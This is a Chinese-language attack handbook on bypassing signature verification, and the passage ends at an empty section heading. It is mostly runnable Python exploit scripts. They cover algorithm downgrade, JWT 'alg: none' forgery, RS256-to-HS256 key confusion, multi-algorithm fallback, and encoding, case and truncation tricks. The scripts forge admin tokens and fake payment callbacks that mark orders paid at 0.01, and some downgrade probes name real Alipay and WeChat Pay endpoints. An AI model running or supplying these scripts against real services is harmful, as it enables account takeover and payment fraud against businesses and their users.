# Signature Algorithm Attacks — 签名算法降级/混淆/None 攻击深度手册

> 目标：篡改签名算法字段、强迫服务器使用弱算法或跳过验证、混淆对称/非对称密钥角色、利用编码和长度缺陷绕过签名校验。每个漏洞必须有服务器端签名验证失败的证据。
>
> **关联技术文件**:
> - [02-auth/jwt/01-alg-none.md](../02-auth/jwt/01-alg-none.md) — JWT `alg: none` 标准绕过
> - [02-auth/jwt/02-algorithm-confusion.md](../02-auth/jwt/02-algorithm-confusion.md) — JWT RS256→HS256 公钥混淆
> - [12-payment/payment-bypass.md](../12-payment/payment-bypass.md) — 支付签名绕过放在支付上下文
> - [12-payment/payment-callback-async.md](../12-payment/payment-callback-async.md) — 回调签名伪造

## 1. 算法降级 (Algorithm Downgrade)

### 1.1 核心原理

签名算法降级的核心在于：**服务器接收客户端指定的算法字段，但未限制算法强度，攻击者可将强算法替换为弱算法或空算法**。

```
┌────────────────────────────────────────────────────────┐
│ 正常流程                                                │
│   Client ─[sign_type=HMAC-SHA256]──▶ Server            │
│   Sign = HMAC-SHA256(key, data)                        │
│                                      verify(sign, K)   │
│                                      ✓ → 200           │
├────────────────────────────────────────────────────────┤
│ 攻击流程                                                │
│   Attacker ─[sign_type=none]───────▶ Server            │
│   Sign = 任意值 / 空                                    │
│                                      verify(sign)?     │
│                                      若 sign_type=none │
│                                      直接跳过验证       │
│                                      ✓ → 200 (绕过!)   │
└────────────────────────────────────────────────────────┘
```

### 1.2 算法字段名字典 (跨框架)

不同框架和支付 SDK 对算法字段的命名不同，攻击时必须枚举所有可能的字段名：

```python
# algorithm_field_names.py — 全覆盖字典
ALGORITHM_FIELD_NAMES = {
    # === 签名算法 ===
    "sign_type": ["MD5", "SHA256", "SHA1", "RSA", "HMAC-SHA256", "HMAC-MD5", "none", ""],
    "sign_method": ["md5", "sha256", "hmac", "rsa", "none", ""],
    "algorithm": ["MD5", "SHA256", "none", "NONE", ""],
    "alg": ["none", "HS256", "RS256", "MD5", "SHA1", ""],
    "alg_type": ["md5", "sha256", "none", ""],
    "hash_method": ["md5", "sha1", "sha256", "none", ""],
    "hash_alg": ["MD5", "SHA256", "SHA1", ""],
    "cipher": ["md5", "sha256", "none", ""],
    "encrypt_type": ["MD5", "SHA256", "NONE", ""],
    "encrypt_method": ["md5", "sha256", "rsa", "none"],
    "security_type": ["MD5", "SHA256", "NONE", ""],

    # === 特定于支付网关 (支付宝/微信/Stripe 风格) ===
    "sign_type_alipay": ["MD5", "RSA", "RSA2", "DSA", "none"],
    "sign_type_wechat": ["MD5", "HMAC-SHA256", "none"],
    "sign_type_stripe": ["", "hmac", "rsa"],
    "sign_type_paypal": ["MD5", "SHA256", "HMAC256", ""],
    "sign_method_xorpay": ["md5", "sha256", "hmac_sha256", ""],
    "sign_type_yungouos": ["MD5", "RSA", "RSA2", "HMAC"],

    # === JWT 类 ===
    "alg_jwt": ["none", "HS256", "HS384", "HS512", "RS256", "RS384", "RS512",
                "ES256", "ES384", "ES512", "EdDSA", ""],

    # === OAuth / OpenID ===
    "token_endpoint_auth_method": ["none", "client_secret_basic", "client_secret_post",
                                   "client_secret_jwt", "private_key_jwt"],
    "request_object_signing_alg": ["none", "RS256", "HS256", ""],
    "id_token_signed_response_alg": ["none", "RS256", "HS256", ""],

    # === Webhook 签名 ===
    "X-Hub-Signature": ["sha1", "sha256", "md5", ""],
    "X-Signature": ["md5", "sha1", "sha256", "none"],
    "Webhook-Signature": ["md5", "hmac-sha1", "hmac-sha256", "none"],
    "X-Line-Signature": ["hmac-sha256", "none", ""],

    # === AWS / Cloud 类 ===
    "X-Amz-SignedHeaders": ["", "none"],
    "X-Amz-Content-SHA256": ["SHA256", "UNSIGNED-PAYLOAD", "STREAMING-AWS4-HMAC-SHA256-PAYLOAD"],

    # === 通用 OAuth 2.0 ===
    "client_assertion_type": [
        "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "urn:ietf:params:oauth:client-assertion-type:none",
        "none"
    ],
    "client_assertion_signing_alg": ["RS256", "HS256", "none", ""],
}
```

### 1.3 伪代码：通用算法降级探针

```python
# algorithm_downgrade_probe.py — 多字段多值降级测试
import requests, itertools, hashlib, hmac, json, time

BASE = "https://target"
S = requests.Session()

def sign_md5(data: dict, key: str = "") -> str:
    """MD5 签名模拟 (常见格式)"""
    raw = "&".join(f"{k}={v}" for k, v in sorted(data.items())) + key
    return hashlib.md5(raw.encode()).hexdigest()

def sign_sha256(data: dict, key: str = "") -> str:
    raw = "&".join(f"{k}={v}" for k, v in sorted(data.items())) + key
    return hashlib.sha256(raw.encode()).hexdigest()

def make_body(alg_field: str, alg_value: str, base_data: dict) -> dict:
    """在 base_data 中插入算法字段"""
    body = dict(base_data)
    body[alg_field] = alg_value
    # 签名值随算法字段变化
    if alg_value.lower() in ("", "none", "null"):
        body["sign"] = ""
    elif "md5" in alg_value.lower():
        body["sign"] = sign_md5(body)
    elif "sha256" in alg_value.lower():
        body["sign"] = sign_sha256(body)
    else:
        body["sign"] = "x" * 32
    return body

def test_downgrade(api_path: str, base_data: dict,
                   endpoints: list[str] = None):
    """对所有算法字段+算法值组合进行降级测试"""
    results = []
    targets = [api_path] if not endpoints else endpoints

    for ep in targets:
        for field, values in ALGORITHM_FIELD_NAMES.items():
            for alg_val in values:
                body = make_body(field, alg_val, base_data)
                # 对每个 body 字段名也遍历常见 sign 字段
                for sign_field in ["sign", "signature", "sig", "sign_data",
                                   "X-Signature", "signStr", "sign_str"]:
                    if sign_field not in body:
                        body[sign_field] = body.pop("sign", "")

                    r = S.post(BASE + ep, json=body, timeout=10)
                    # 关注非 4xx 响应
                    if r.status_code not in (400, 401, 403, 405):
                        results.append({
                            "endpoint": ep,
                            "alg_field": field,
                            "alg_value": alg_val,
                            "sign_field": sign_field,
                            "status": r.status_code,
                            "body": r.text[:300],
                            "response_time": r.elapsed.total_seconds(),
                        })
                    time.sleep(0.05)
    return results
```

### 1.4 框架特定降级案例

#### 支付宝 (Alipay)

老版本支付宝使用 `sign_type=MD5`。如果服务器未强制检查 sign_type：

```python
# alipay_downgrade.py — 支付宝签名降级
def alipay_downgrade_attack(order_id: str, amount: str):
    """支付宝老接口 sign_type 降级"""
    # 正常请求 (RSA2)
    normal = {
        "app_id": "202100...",
        "method": "alipay.trade.page.pay",
        "charset": "utf-8",
        "sign_type": "RSA2",
        "timestamp": "2024-01-01 12:00:00",
        "version": "1.0",
        "biz_content": json.dumps({
            "out_trade_no": order_id,
            "total_amount": amount,
            "product_code": "FAST_INSTANT_TRADE_PAY"
        }),
    }
    # 对正常请求做 RSA 签名
    normal["sign"] = rsa_sign(normal, private_key)

    # 降级请求 (MD5) — 如果服务器接受 MD5 且 MD5 key 泄露或弱
    downgrade = dict(normal)
    downgrade["sign_type"] = "MD5"
    # MD5 签名: 使用简单 key
    downgrade["sign"] = sign_md5(normal, key="test_key_123")

    for data in [normal, downgrade]:
        r = S.post("https://openapi.alipay.com/gateway.do", params=data)
        print(f"sign_type={data['sign_type']} → {r.status_code} | {r.text[:200]}")
```

#### 微信支付 (WeChat Pay)

微信支付支持 `sign_type=MD5` 和 `sign_type=HMAC-SHA256`。若服务器不强制 signing 方式：

```python
# wechat_downgrade.py
def wechat_downgrade_test(prepay_id: str):
    """微信支付 sign_type 降级"""
    base = {
        "appid": "wx...",
        "mch_id": "123...",
        "nonce_str": "random123",
        "prepay_id": prepay_id,
        "package": "Sign=WXPay",
    }

    # HMAC-SHA256 (正常)
    data_sha256 = dict(base, sign_type="HMAC-SHA256")
    data_sha256["sign"] = hmac.new(
        b"merchant_key", json.dumps(data_sha256).encode(), hashlib.sha256
    ).hexdigest().upper()

    # MD5 (降级)
    data_md5 = dict(base, sign_type="MD5")
    # MD5 签名直接用 key 拼接
    raw = "&".join(f"{k}={v}" for k, v in sorted(data_md5.items())) + "&key=merchant_key"
    data_md5["sign"] = hashlib.md5(raw.encode()).hexdigest().upper()

    for data in [data_sha256, data_md5]:
        xml_body = dict_to_xml(data)  # 微信用 XML
        r = S.post("https://api.mch.weixin.qq.com/pay/unifiedorder",
                   data=xml_body.encode("utf-8"),
                   headers={"Content-Type": "text/xml"})
        print(f"sign_type={data['sign_type']} → {r.status_code} | {r.text[:300]}")
```

### 1.5 降级检测信号

| 信号 | 含义 | 置信度 |
|------|------|--------|
| 服务器接受 `sign_type=MD5` 替换 `SHA256` | 算法降级成功 | 高 |
| 响应非 4xx 且订单状态变化 | 绕过成功 | 确认 |
| 错误信息包含 "sign_type xxx not supported" | 列表白名单，但包含弱算法 | 中 |
| 错误信息包含 "invalid signature" 而非 "unsupported algorithm" | 算法接受但签名值错误 | 高（签名正确即可过） |

## 2. "None" 算法攻击

### 2.1 JWT `alg: none`（摘要）

JWT `alg: none` 绕过在 [02-auth/jwt/01-alg-none.md](../02-auth/jwt/01-alg-none.md) 中有完整文档，此处仅给可执行脚本：

```python
# jwt_none.py — JWT alg none 全覆盖测试
import base64, json, requests

def b64url(data: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).rstrip(b'=').decode()

def forge_jwt_none(payload: dict, header_variant: dict) -> str:
    h = b64url(header_variant)
    p = b64url(payload)
    return f"{h}.{p}."

ALG_NONE_VARIANTS = [
    {"alg": "none", "typ": "JWT"},
    {"alg": "None", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},
    {"alg": "NoNe", "typ": "JWT"},
    {"alg": "",      "typ": "JWT"},
    {"alg": None,    "typ": "JWT"},
    {"alg": "none",  "typ": "JWT",  "kid": ""},
    {"alg": "none",  "typ": "JWT",  "kid": "../../dev/null"},
    {"alg": ["none", "HS256"], "typ": "JWT"},  # 数组注入
    {"alg": "none", "typ": "account"},          # 非标准 typ
]

ADMIN_PAYLOAD = {
    "sub": "admin",
    "role": "admin",
    "iat": 9999999999,
    "exp": 9999999999,
}

def test_jwt_none(target_url: str, header_field: str = "Authorization"):
    """全覆盖测试 JWT alg none"""
    for i, hdr in enumerate(ALG_NONE_VARIANTS):
        token = forge_jwt_none(ADMIN_PAYLOAD, hdr)
        r = requests.get(target_url, headers={header_field: f"Bearer {token}"})
        print(f"[{i:02d}] {str(hdr['alg']):20s} → {r.status_code}")
        if r.status_code not in (401, 403):
            print(f"     [!] BYPASS! Body: {r.text[:200]}")
```

### 2.2 通用 "none" 算法（非 JWT）

支付系统和 Webhook 签名的 "none" 类型更多样：

```python
# universal_none_test.py — 非 JWT 上下文的 none 测试
from itertools import product

def test_none_in_sign_fields(api_path: str, base_data: dict):
    """测试 signature/sign/x-signature 等字段的各种"空"值"""
    NONE_PAYLOADS = {
        # 空值
        "empty_string": "",
        "null_string": "null",
        "undefined_string": "undefined",
        "none_string": "none",
        "None_string": "None",

        # 零值
        "zero_int": 0,
        "zero_float": 0.0,
        "zero_str": "0",
        "false_bool": False,

        # 占位符
        "null": None,
        "nil": "nil",
        "nan": "NaN",

        # 特殊 JWT 签名标记
        "no_sign": "no_sign",
        "unsigned": "unsigned",
        "nosign": "nosign",
        "unused": "unused",
        "skip": "skip",
        "bypass": "bypass",

        # 算法设为 none 时对应的签名
        "alg_none": "none",
        "algorithm_none": "none",
    }

    SIGN_FIELDS = ["sign", "signature", "sign_data", "sig", "signStr",
                   "sign_str", "X-Signature", "x_sign", "sign_info",
                   "token", "X-Hub-Signature", "webhook_signature"]

    results = []
    for sf, pv in product(SIGN_FIELDS, NONE_PAYLOADS.items()):
        body = dict(base_data)
        body[sf] = pv[1]
        r = requests.post(BASE + api_path, json=body, timeout=10)
        if r.status_code not in (400, 401, 403):
            results.append({
                "field": sf,
                "value_label": pv[0],
                "value_repr": repr(pv[1]),
                "status": r.status_code,
                "response": r.text[:200],
            })
        time.sleep(0.03)
    return results
```

### 2.3 算法缺失 / 默认降级

某些签名库在算法字段缺失时默认使用"不验证"或"最低安全级别"：

```python
# test_missing_algorithm.py
def test_missing_algorithm_fields(notify_path: str, order_id: str):
    """测试缺少算法字段时的默认行为"""
    SCENARIOS = [
        # 场景 1: 完全不加 sign_type 字段
        {"out_trade_no": order_id, "trade_status": "TRADE_SUCCESS",
         "total_amount": "0.01", "sign": ""},

        # 场景 2: sign_type 字段存在但值为空
        {"out_trade_no": order_id, "trade_status": "TRADE_SUCCESS",
         "total_amount": "0.01", "sign": "", "sign_type": ""},

        # 场景 3: sign_type 写错
        {"out_trade_no": order_id, "trade_status": "TRADE_SUCCESS",
         "total_amount": "0.01", "sign": "", "sign_typo": "MD5"},

        # 场景 4: 算法字段在嵌套对象中
        {"out_trade_no": order_id, "trade_status": "TRADE_SUCCESS",
         "total_amount": "0.01", "sign": "",
         "algorithm_config": {"sign_type": "MD5"}},

        # 场景 5: 签名和算法字段都在 header 而非 body
    ]

    for i, body in enumerate(SCENARIOS):
        r = requests.post(BASE + notify_path, json=body, timeout=10)
        print(f"[{i}] missing field test → {r.status_code} | {r.text[:200]}")
        if r.status_code == 200 and "fail" not in r.text.lower():
            print(f"    [!] No-verify callback accepted!")
```

## 3. 算法混淆 (Algorithm Confusion)

### 3.1 JWT RS256 → HS256（摘要）

JWT 算法混淆在 [02-auth/jwt/02-algorithm-confusion.md](../02-auth/jwt/02-algorithm-confusion.md) 中有完整文档，此处给出自动提取公钥并攻击的脚本：

```python
# jwt_confusion_auto.py — 自动提取公钥 + HS256 替换攻击
import base64, json, hmac, hashlib, requests, re

class JWTAlgorithmConfusionExploit:
    """JWT RS256→HS256 算法混淆自动攻击器"""

    def __init__(self, target: str):
        self.target = target.rstrip("/")
        self.public_key_pem: bytes | None = None
        self.public_key_b64: str | None = None
        self.jwks: dict | None = None

    def discover_public_key(self) -> bool:
        """从常见路径发现公钥"""
        endpoints = [
            "/.well-known/jwks.json",
            "/.well-known/openid-configuration",
            "/jwks.json",
            "/api/jwks",
            "/openid/connect/jwks",
            "/.well-known/oauth-authorization-server",
            "/oauth2/keys",
            "/public.key",
            "/cert.pem",
            "/api/public-key",

            # 常见泄露
            "/static/jwks.json",
            "/assets/jwks.json",
            "/config/jwks.json",
        ]

        for ep in endpoints:
            try:
                r = requests.get(self.target + ep, timeout=15)
                if r.status_code != 200:
                    continue
                data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}

                # 从 JWKS 提取
                if "keys" in data and len(data["keys"]) > 0:
                    self.jwks = data
                    first_key = data["keys"][0]
                    if "n" in first_key and "e" in first_key:
                        self.public_key_b64 = json.dumps(first_key)
                        self.public_key_pem = self._jwk_to_pem(first_key)
                        return True

                # 从 openid-configuration 跳转
                if "jwks_uri" in data:
                    r2 = requests.get(data["jwks_uri"], timeout=15)
                    if r2.status_code == 200:
                        self.jwks = r2.json()
                        first_key = self.jwks["keys"][0]
                        if "n" in first_key and "e" in first_key:
                            self.public_key_b64 = json.dumps(first_key)
                            self.public_key_pem = self._jwk_to_pem(first_key)
                            return True

                # 直接 PEM
                if b"-----BEGIN PUBLIC KEY-----" in r.content:
                    self.public_key_pem = r.content
                    return True

            except Exception:
                continue
        return False

    def _jwk_to_pem(self, jwk: dict) -> bytes:
        """JWK → PEM (纯 Python 实现，无依赖)"""
        # base64url → int
        def b64_to_int(s: str) -> int:
            pad = 4 - len(s) % 4
            if pad != 4:
                s += "=" * pad
            return int.from_bytes(base64.urlsafe_b64decode(s), 'big')

        n = b64_to_int(jwk["n"])
        e = b64_to_int(jwk["e"])

        # 构造 DER 编码的 SubjectPublicKeyInfo
        # 此处省略完整 DER 编码；在生产中使用 cryptography 库
        # 简化版本：直接返回 JWK 的 n 的 bytes，供 HMAC 测试
        return base64.urlsafe_b64decode(jwk["n"] + "==")

    def forge_hmac_token(self, payload: dict, key: bytes,
                         algorithm: str = "HS256") -> str:
        """用公钥字节作为 HMAC 密钥伪造 token"""
        hash_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        header = {"alg": algorithm, "typ": "JWT"}
        h_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).rstrip(b'=').decode()
        p_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).rstrip(b'=').decode()
        msg = f"{h_b64}.{p_b64}".encode()
        sig = hmac.new(key, msg, hash_map[algorithm]).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        return f"{h_b64}.{p_b64}.{sig_b64}"

    def attack(self, admin_payload: dict = None,
               target_api: str = "/api/admin") -> tuple[bool, str, str]:
        """执行完整攻击链"""
        if admin_payload is None:
            admin_payload = {
                "sub": "admin", "role": "admin", "iat": 9999999999
            }

        if not self.discover_public_key():
            return False, "", "Public key not found"

        token = self.forge_hmac_token(admin_payload, self.public_key_pem)
        r = requests.get(
            self.target + target_api,
            headers={"Authorization": f"Bearer {token}"},
            timeout=15
        )

        if r.status_code == 200:
            return True, token, r.text[:300]
        return False, token, f"Status: {r.status_code}"

    def brute_force_hmac_key_from_pub(self, token: str) -> str | None:
        """尝试不同算法 + 公钥格式组合"""
        attempts = [
            # 原始 JWK n bytes
            ("HS256", self.public_key_pem),
            ("HS384", self.public_key_pem),
            ("HS512", self.public_key_pem),
            # PEM 文本
            ("HS256", self.public_key_pem if b"BEGIN" in (self.public_key_pem or b"") else None),
            # JWK JSON bytes
            ("HS256", self.public_key_b64.encode() if self.public_key_b64 else None),
        ]

        for alg, key_bytes in attempts:
            if key_bytes is None:
                continue
            # 生成 token 并验证... (此处简化)
            pass
        return None
```

### 3.2 MD5 vs HMAC-MD5 混淆

```python
# md5_vs_hmac_confusion.py — 简单 MD5 与 HMAC-MD5 的混淆攻击

# 背景: 某些框架同时支持 sign_method=MD5 和 sign_method=HMAC_MD5
# MD5:     sign = MD5(key + sorted_params + key)
# HMAC-MD5: sign = HMAC-MD5(key, sorted_params)

# 如果服务器对两个算法的 key 使用不同长度/来源:
# - MD5 key = "merchant_key_123"
# - HMAC-MD5 key = merchant_key_123 前置 sha256 后的字节

# 攻击: 如果服务器接受 sign_method 替换:
def test_md5_hmac_confusion(base_data: dict):
    """测试 MD5 ↔ HMAC-MD5 混淆"""
    # MD5 签名 (已知弱 key 或无 key)
    md5_sign = hashlib.md5("merchant_key_123".encode()).hexdigest()

    # HMAC-MD5 签名 (同一 key)
    hmac_md5_sign = hmac.new(b"merchant_key_123", json.dumps(base_data).encode(), "md5").hexdigest()

    attacks = [
        # 用 MD5 签名值放到 HMAC-MD5 字段
        {"sign_type": "HMAC_MD5", "sign": md5_sign},
        # 用 HMAC-MD5 签名值放到 MD5 字段
        {"sign_type": "MD5", "sign": hmac_md5_sign},
        # 空字符串用作 HMAC key
        {"sign_type": "HMAC_MD5", "sign": hmac.new(b"", "".encode(), "md5").hexdigest()},
        # 签名字段与算法字段不匹配
        {"sign_type": "MD5", "sign": hashlib.sha256(b"data").hexdigest()},
    ]
    return attacks
```

### 3.3 SHA1 vs HMAC-SHA1 混淆

```python
# sha1_hmac_confusion.py
def test_sha1_confusion(base_data: dict):
    """SHA1 ↔ HMAC-SHA1 混淆"""
    raw = "&".join(f"{k}={v}" for k, v in sorted(base_data.items()))

    # 服务端可能用两种不同方式:
    # 1. sign = SHA1(key + data + key)
    sha1_concat = hashlib.sha1((b"secret" + raw.encode() + b"secret")).hexdigest()

    # 2. sign = HMAC-SHA1(key, data)
    hmac_sha1 = hmac.new(b"secret", raw.encode(), "sha1").hexdigest()

    # 如果服务端误用:
    # - 应做 HMAC-SHA1 但用了 SHA1 拼接 → SHA1 变体可伪造
    # - 两种方式 key 处理不同 → 传入空 key 测试
    for key in [b"", b"secret", b"null", b"0"]:
        for data in [raw.encode(), b""]:
            s1 = hashlib.sha1(key + data + key).hexdigest()
            h1 = hmac.new(key, data, "sha1").hexdigest()
            print(f"key={key!r:20s} sha1={s1:48s} hmac-sha1={h1:48s}")
```

### 3.4 公钥作为 HMAC 密钥（广谱攻击）

```python
# public_key_as_hmac.py — 用各种公钥格式做 HMAC 密钥
def public_key_as_hmac_attacks(public_keys: list[bytes], data: bytes) -> list[dict]:
    """用多种格式的公钥字节作为 HMAC key 测试"""
    algorithms = [
        ("HS256", hashlib.sha256),
        ("HS384", hashlib.sha384),
        ("HS512", hashlib.sha512),
        ("MD5", hashlib.md5),
        ("SHA1", hashlib.sha1),
    ]
    results = []
    for pk in public_keys:
        for alg_name, hash_func in algorithms:
            sig = hmac.new(pk, data, hash_func).hexdigest()
            results.append({
                "algorithm": alg_name,
                "key_preview": pk[:32].hex(),
                "key_length": len(pk),
                "signature": sig,
            })
    return results

# 常见公钥格式
PUBLIC_KEY_FORMATS = [
    # 原始 JWK n bytes
    b"..." if False else b"",
    # PEM (文本)
    b"-----BEGIN PUBLIC KEY-----\n...",
    # DER 二进制
    b"\x30\x82...",
    # SSH 格式
    b"ssh-rsa AAAAB3NzaC1yc2E...",
    # 仅模数 n
    b"\x00\x00\x00\x01\x00\x01...",
]
```

## 4. 多算法签名回退

### 4.1 第一个成功的算法

某些签名验证逻辑遍历支持的算法列表，一旦某个算法验证通过就接受。这允许注入弱算法：

```python
# multi_algorithm_fallback.py — 多算法回退攻击

# 漏洞伪代码:
# ```
# function verify_sign(data, algorithms):
#     for alg in algorithms:           # ← 遍历，第一个成功就返回
#         if verify_with_alg(data, alg):
#             return True
#     return False
# ```

def attack_fallback(api_path: str, base_data: dict):
    """注入多个签名，让服务器遍历到弱算法时通过"""
    ALGORITHM_FIELD_MAP = {
        "MD5": lambda d, k: hashlib.md5((json.dumps(d) + k).encode()).hexdigest(),
        "SHA1": lambda d, k: hashlib.sha1((json.dumps(d) + k).encode()).hexdigest(),
        "SHA256": lambda d, k: hashlib.sha256((json.dumps(d) + k).encode()).hexdigest(),
        "none": lambda d, k: "",
        "HMAC-MD5": lambda d, k: hmac.new(k.encode(), json.dumps(d).encode(), "md5").hexdigest(),
        "HMAC-SHA1": lambda d, k: hmac.new(k.encode(), json.dumps(d).encode(), "sha1").hexdigest(),
    }

    weak_keys = ["", "test", "123456", "key", "secret", "password",
                 "test_key", "merchant", "default", "debug"]

    for weak_alg in ["MD5", "HMAC-MD5", "none", "SHA1"]:
        for key in weak_keys:
            # 构造请求：同时包含多个 sign_type + 对应的 sign
            body = dict(base_data)
            hash_fn = ALGORITHM_FIELD_MAP.get(weak_alg, lambda d, k: "x" * 32)
            weak_sign = hash_fn(body, key)

            # 注入多个 sign 字段 — 服务器可能取第一个能解的
            body["sign"] = weak_sign
            body["sign_type"] = weak_alg
            body["X-Preferred-Algorithm"] = weak_alg

            r = requests.post(BASE + api_path, json=body, timeout=10)
            if r.status_code == 200 and "fail" not in r.text.lower():
                print(f"[!] Fallback attack: alg={weak_alg} key={key}")
                print(f"    Status: {r.status_code} | {r.text[:200]}")
                return True
    return False
```

### 4.2 并行注入弱算法

```python
# parallel_algorithm_injection.py
def parallel_signature_injection(api_path: str, base_data: dict):
    """在同一请求中同时发送强、弱两种签名，看服务器选哪个"""
    body = dict(base_data)

    # 弱签名 (MD5, 空 key)
    body["sign_md5"] = hashlib.md5(json.dumps(base_data).encode()).hexdigest()
    body["sign_type_md5"] = "MD5"

    # 强签名 (SHA256, 带 key) — 这个签名可能是错的
    body["sign_sha256"] = hashlib.sha256((json.dumps(base_data) + "real_key").encode()).hexdigest()
    body["sign_type_sha256"] = "SHA256"

    # 签名主字段设置为弱签名
    body["sign"] = body["sign_md5"]
    body["sign_type"] = "MD5"

    r = requests.post(BASE + api_path, json=body, timeout=10)
    print(f"Parallel injection → {r.status_code} | {r.text[:200]}")

    # 变种: 交换强弱顺序
    body["sign"] = body["sign_sha256"]
    r = requests.post(BASE + api_path, json=body, timeout=10)
    print(f"Parallel injection (swap) → {r.status_code} | {r.text[:200]}")
```

### 4.3 签名栈回退

有些签名处理流程是栈式的——先拿 header 算法，再遍历 body 中的 sign_type，再回退到配置默认值：

```python
# signature_stack_fallback.py
def test_stack_fallback(api_path: str, base_data: dict):
    """测试多个位置的算法优先级"""
    STACK_ATTACKS = [
        # Header → Body → Config 回退
        # 情况: Header 无算法 → Body 无算法 → Config 默认(弱)
        {"alg": "", "sign_type": "", "sign": ""},

        # Header 弱 → Body 强 → 可能取 Header
        {"alg": "none", "sign_type": "SHA256", "sign": "x" * 64},

        # Body 弱 → Config 强 → 可能取 Body
        {"alg": "SHA256", "sign_type": "MD5", "sign": "x" * 32},

        # 混合来源
        {"X-Algorithm": "none", "sign_type": "SHA256", "sign": ""},

        # 多重嵌套
        {"signature_config": {"algorithm": "MD5", "min_strength": "none"}},
    ]
    for attack in STACK_ATTACKS:
        body = dict(base_data, **attack)
        r = requests.post(BASE + api_path, json=body, timeout=10)
        print(f"stack={str(attack)[:60]} → {r.status_code}")
```

## 5. 签名编码攻击

### 5.1 Hex vs Base64 vs Base64URL

同一签名值在不同编码下表现不同。如果服务器做"解码后比较"而不是"解码后重算"：

```python
# encoding_confusion.py — 签名编码混淆攻击
import base64

class SignatureEncodingAttack:
    """签名编码混淆 — 让服务器解码出不同结果"""

    @staticmethod
    def hex_to_bytes(h: str) -> bytes:
        return bytes.fromhex(h)

    @staticmethod
    def b64_to_bytes(b: str) -> bytes:
        return base64.b64decode(b + "=" * (4 - len(b) % 4) if len(b) % 4 else b)

    @staticmethod
    def b64url_to_bytes(b: str) -> bytes:
        return base64.urlsafe_b64decode(b + "=" * (4 - len(b) % 4) if len(b) % 4 else b)

    @staticmethod
    def bytes_to_hex(b: bytes) -> str:
        return b.hex()

    @staticmethod
    def bytes_to_b64(b: bytes) -> str:
        return base64.b64encode(b).decode()

    @staticmethod
    def bytes_to_b64url(b: bytes) -> str:
        return base64.urlsafe_b64encode(b).decode().rstrip("=")

    def generate_encoding_variants(self, md5_hash: str) -> dict[str, str]:
        """
        对同一 MD5 hex hash 生成多种编码变体

        MD5("hello") = "5d41402abc4b2a76b9719d911017c592"
        """
        raw_bytes = self.hex_to_bytes(md5_hash)  # 16 bytes

        # 直接 hex (原始)
        hex_lower = raw_bytes.hex()
        hex_upper = raw_bytes.hex().upper()
        hex_no_prefix = raw_bytes.hex()

        # base64 编码
        b64_std = self.bytes_to_b64(raw_bytes)
        b64_url = self.bytes_to_b64url(raw_bytes)

        # base64 编码 hex 字符串 (双重编码)
        double_b64 = self.bytes_to_b64(md5_hash.encode())

        # 十六进制大写 base64
        hex_upper_bytes = hex_upper.encode()
        b64_of_hex_upper = self.bytes_to_b64(hex_upper_bytes)

        return {
            "hex_lower": hex_lower,
            "hex_upper": hex_upper,
            "b64_standard": b64_std,
            "b64_urlsafe": b64_url,
            "double_b64": double_b64,
            "b64_of_hex_upper": b64_of_hex_upper,
        }

# 攻击时的服务器行为可能:
# - 接受 hex 也接受 base64 → 用 base64 编码的同一签名可绕过某些场景
# - hex 比较时忽略大小写 → 大写 hex 可能匹配
# - "先解码再比较" → 如果解码异常，跳过比较
```

### 5.2 双重编码

```python
# double_encoding_attack.py
def double_encoding_test(notify_path: str, order_data: dict):
    """测试签名双层编码绕过"""

    # 场景: 服务端 sign = base64(md5(data))
    # 但如果攻击者传 sign = base64(md5(data)) 的 hex 字符串?
    # 或 sign = hex(md5(data)) 的 base64?

    data_str = json.dumps(order_data, sort_keys=True)

    # 第一层: MD5 → hex
    md5_hex = hashlib.md5(data_str.encode()).hexdigest()

    # 第二层: base64
    md5_b64 = base64.b64encode(md5_hex.encode()).decode()

    # 反向: base64 → hex
    b64_first = base64.b64encode(data_str.encode()).decode()
    md5_of_b64 = hashlib.md5(b64_first.encode()).hexdigest()

    payloads = [
        # 正常
        {"sign": md5_hex, "encoding": "hex"},
        # 双重编码
        {"sign": md5_b64, "encoding": "base64"},
        # 反向双重
        {"sign": md5_of_b64, "encoding": "hex"},
        # 三重
        {"sign": base64.b64encode(md5_b64.encode()).decode(), "encoding": "base64"},
        # 各种 encoding 声明
        {"sign": md5_hex, "encoding": "utf-8"},
        {"sign": md5_hex, "encoding": "binary"},
        {"sign": md5_hex, "encoding": None},
    ]

    for data in payloads:
        body = dict(order_data, **data)
        r = requests.post(BASE + notify_path, json=body, timeout=10)
        print(f"encoding={data.get('encoding')} sign_len={len(data['sign'])} "
              f"→ {r.status_code} | {r.text[:150]}")
```

### 5.3 大小写敏感性

```python
# case_sensitivity_test.py — 签名大小写测试
def test_signature_case(api_path: str, base_data: dict):
    """测试签名比较是否区分大小写"""

    data_str = json.dumps(base_data, sort_keys=True)
    md5_hex = hashlib.md5(data_str.encode()).hexdigest()

    CASE_VARIANTS = [
        md5_hex,                    # 原始小写
        md5_hex.upper(),            # 全大写
        md5_hex.capitalize(),       # 首字母大写
        md5_hex.swapcase(),         # 大小写翻转
        md5_hex[:16].upper() + md5_hex[16:],  # 前一半大写
    ]

    for idx, sign in enumerate(CASE_VARIANTS):
        body = dict(base_data, sign=sign)
        r = requests.post(BASE + api_path, json=body, timeout=10)
        if r.status_code == 200:
            print(f"[{idx}] Case bypass! sign={sign[:40]}... → {r.status_code}")
        else:
            print(f"[{idx}] sign={sign[:40]}... → {r.status_code}")
```

### 5.4 截断签名匹配

```python
# truncated_signature.py — 截断签名绕过
def test_truncated_signature(api_path: str, base_data: dict):
    """服务器只比较签名前 N 个字符"""
    full_sign = hashlib.md5(json.dumps(base_data, sort_keys=True).encode()).hexdigest()

    for length in [1, 2, 4, 8, 16, 20, 24]:
        truncated = full_sign[:length]
        body = dict(base_data, sign=truncated)
        r = requests.post(BASE + api_path, json=body, timeout=10)
        result = "BYPASS!" if r.status_code == 200 else "blocked"
        print(f"  truncate to {length:2d}: {truncated:30s} → {r.status_code} {result}")

    # 也测试空签名
    body = dict(base_data, sign="")
    r = requests.post(BASE + api_path, json=body, timeout=10)
    print(f"  empty sign: → {r.status_code} {'BYPASS!' if r.status_code == 200 else 'blocked'}")
```

## 6. 签名长度攻击

### 6.1 空签名

